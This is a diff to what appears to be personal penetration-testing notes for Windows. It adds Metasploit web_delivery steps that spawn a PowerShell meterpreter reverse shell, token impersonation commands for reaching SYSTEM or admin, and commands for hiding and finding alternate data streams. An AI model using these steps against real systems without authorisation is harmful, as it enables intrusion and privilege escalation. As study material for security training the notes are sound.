@@ -194,9 +194,9 @@ shell
 	
 	
 	
-=======================
-===ENUMERATION TOOLS===
-=======================
+======================================
+===ENUMERATION / EXPLOITATION TOOLS===
+======================================
 
 Executables:
 	| winPEAS.exe
@@ -214,6 +214,16 @@ Other:
 	| Exploit Suggester (Metasploit)
 	
 Metasploit:
+	| use multi/script/web_delivery
+		| set target (PSH / PowerShell)
+		| set payload (windows/meterpreter/reverse_tcp for x86)
+		| run
+			| Gives you a command to run on the target machine and spawns its own server
+				| Makes connection to metasploit server
+				| Spawns a sesson
+				| sessions -i x : interact with that session
+	
+	
 	
 	| After getting a shell:
 		| getuid : Get user ID 
@@ -230,7 +240,25 @@ Metasploit:
 		
 	| Token Impersonation through Meterpreter
 		| getuid : Get user ID
+		| getprivs
 		| load incognito : Loads module
 		| list_tokens -u : Lists tokens
 		| impersonate_token host\\user : Impersonate the token of <user> on <host> (Can be SYSTEM or Admin etc)
-		
+
+Alternate Data Streams
+	| https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
+	
+	| CMD
+		| Check for Alternate Data Streams
+			| dir /R 
+		| more < <file with ADS>:<name of ADS>:$DATA
+	| PS
+		| Add an Alternate Data Stream
+			| Set-Content -Path C:\Path\to\file -stream <name of stream>
+		| Read out the Alternate Data Stream
+			| Get-Content -Path C:\Path\to\file -stream <name of stream>
+		| Search for Alternate Data Streams
+			| gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
+		| Remove Alternate Data Streams
+			| Remove-Item -path C:\Path\to\file -stream <name of stream>
+			
